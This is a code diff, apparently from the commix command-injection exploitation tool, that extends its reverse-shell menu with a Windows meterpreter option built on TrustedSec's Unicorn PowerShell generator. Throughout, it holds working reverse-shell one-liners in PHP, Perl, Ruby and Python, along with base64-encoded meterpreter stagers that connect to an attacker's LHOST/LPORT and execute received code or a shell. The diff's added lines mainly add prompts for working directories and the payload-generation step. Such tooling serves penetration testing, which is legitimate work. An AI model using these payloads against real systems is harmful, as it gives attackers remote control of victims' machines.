@@ -14,9 +14,12 @@
  For more see the file 'readme/COPYING' for copying permission.
 """
 
+import os
 import re
 import sys
+import time
 import base64
+import subprocess
 from src.utils import menu
 from src.utils import settings
 from src.thirdparty.colorama import Fore, Back, Style, init
@@ -122,7 +125,8 @@ def other_reverse_shells():
   Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use a Python reverse TCP shell.
   \n  ---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter reverse TCP shells""" + Style.RESET_ALL + """ ]---
   Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a PHP meterpreter reverse TCP shell.
-  Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell.  
+  Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a Python meterpreter reverse TCP shell. 
+  Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Windows meterpreter reverse TCP shell. 
 
 commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL + """) > """)
     # PHP-reverse-shell
@@ -130,6 +134,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
       other_shell = "php -r '$sock=fsockopen(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
                 "exec(\"/bin/sh -i <%263 >%263 2>%263\");'"
       break
+
     # Perl-reverse-shell
     elif other_shell == '2':
       other_shell = "perl -e 'use Socket;" \
@@ -140,6 +145,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
                 "open(STDOUT,\">%26S\");open(STDERR,\">%26S\");" \
                 "exec(\"/bin/sh -i\");};'"
       break
+
     # Ruby-reverse-shell
     elif other_shell == '3':
       other_shell = "ruby -rsocket -e 'exit if fork;" \
@@ -147,6 +153,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
                 "while(cmd=c.gets);" \
                 "IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
       break
+
     # Python-reverse-shell 
     elif other_shell == '4':
       other_shell = "python -c 'import socket,subprocess,os%0d" \
@@ -157,6 +164,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
                 "os.dup2(s.fileno(),2)%0d" \
                 "p=subprocess.call([\"/bin/sh\",\"-i\"])%0d'"
       break
+
     # PHP-reverse-shell (meterpreter)
     elif other_shell == '5':
       other_shell ="""/*<?php /**/ error_reporting(0); 
@@ -174,10 +182,32 @@ $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len)
 case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();"""
       other_shell = base64.b64encode(other_shell)
       if settings.TARGET_OS == "win": 
-        other_shell = settings.WIN_PHP_DIR + "php.exe -r \"eval(base64_decode(" +other_shell+ "));\""
+        print ""
+        while True:
+          question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
+          question_msg += "' as PHP working directory on the target host? [Y/n] > "
+          sys.stdout.write(settings.print_question_msg(question_msg))
+          php_dir = sys.stdin.readline().replace("\n","").lower()
+          if php_dir in settings.CHOICE_YES:
+            break
+          elif php_dir in settings.CHOICE_NO:
+            question_msg = "Please provide a custom working directory for PHP (e.g. '" 
+            question_msg += settings.WIN_PHP_DIR + "') > "
+            sys.stdout.write(settings.print_question_msg(question_msg))
+            settings.WIN_PHP_DIR = sys.stdin.readline().replace("\n","").lower()
+            break
+          else:
+            if php_dir == "":
+              php_dir = "enter"
+            err_msg = "'" + php_dir + "' is not a valid answer."  
+            print settings.print_error_msg(err_msg)
+            pass
+
+        other_shell = settings.WIN_PHP_DIR + " -r eval(base64_decode(" + other_shell + "));"
       else:
-        other_shell = "php -r \"eval(base64_decode(" +other_shell+ "));\""
+        other_shell = "php -r \"eval(base64_decode(" + other_shell + "));\""
       break
+
     # Python-reverse-shell (meterpreter)
     elif other_shell == '6':
       other_shell = """import socket,struct
@@ -189,10 +219,71 @@ while len(d)!=l:
   d+=s.recv(4096)
 exec(d,{'s':s})"""      
       other_shell = base64.b64encode(other_shell)
-      if settings.TARGET_OS == "win": 
-        other_shell = settings.WIN_PYTHON_DIR + "python.exe -c \"exec('" +other_shell+ "'.decode('base64'))\""
+      if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
+        print ""
+        while True:
+          question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
+          question_msg += "' as Python working directory on the target host? [Y/n] > "
+          sys.stdout.write(settings.print_question_msg(question_msg))
+          python_dir = sys.stdin.readline().replace("\n","").lower()
+          if python_dir in settings.CHOICE_YES:
+            break
+          elif python_dir in settings.CHOICE_NO:
+            question_msg = "Please provide a custom working directory for Python (e.g. '" 
+            question_msg += settings.WIN_PYTHON_DIR + "') > "
+            sys.stdout.write(settings.print_question_msg(question_msg))
+            settings.WIN_PYTHON_DIR = sys.stdin.readline().replace("\n","").lower()
+            break
+          else:
+            if python_dir == "":
+              python_dir = "enter"
+            err_msg = "'" + python_dir + "' is not a valid answer."  
+            print settings.print_error_msg(err_msg)
+            pass
+        other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + other_shell + "'.decode('base64'))"
       else:
-        other_shell = "python -c \"exec('" +other_shell+ "'.decode('base64'))\""
+        other_shell = "python -c \"exec('" + other_shell + "'.decode('base64'))\""
+      break
+
+    elif other_shell == '7':
+      if not settings.TARGET_OS == "win":
+        error_msg = "This attack vector is available only for Windows targets."
+        print settings.print_error_msg(error_msg)
+        continue
+      else:
+        while True:
+          windows_reverse_shell = raw_input("""
+  ---[ """ + Style.BRIGHT + Fore.BLUE + """Powershell injection attacks""" + Style.RESET_ALL + """ ]---
+  Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use TrustedSec's Magic Unicorn.
+
+commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + Style.RESET_ALL + """) > """)
+          
+          payload = "windows/meterpreter/reverse_tcp"
+          # TrustedSec's Magic Unicorn (3rd Party)
+          if windows_reverse_shell == '1':
+            if os.path.exists(settings.METASPLOIT_PATH):
+              unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
+              os.chdir(unicorn_path)
+              # define standard metasploit payload
+              info_msg = "Please wait, while generating the payload shellcode... "
+              sys.stdout.write("\n" + settings.print_info_msg(info_msg))
+              sys.stdout.flush()
+              try:
+                subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
+                # Remove the "unicorn.rc" file.
+                os.remove("unicorn.rc")
+                with open("powershell_attack.txt", 'r') as content_file:
+                  other_shell = content_file.read().replace('\n', '')
+                print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+                # Remove the "powershell_attack.txt" file.
+                os.remove("powershell_attack.txt")
+              except:
+                print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+              break
+            else:
+              error_msg = "You need to have Metasploit installed. Please ensure Metasploit is installed in the right path."
+              print settings.print_error_msg(error_msg)
+              break
       break
     elif other_shell.lower() == "reverse_tcp":
       warn_msg = "You are already into the 'reverse_tcp' mode."
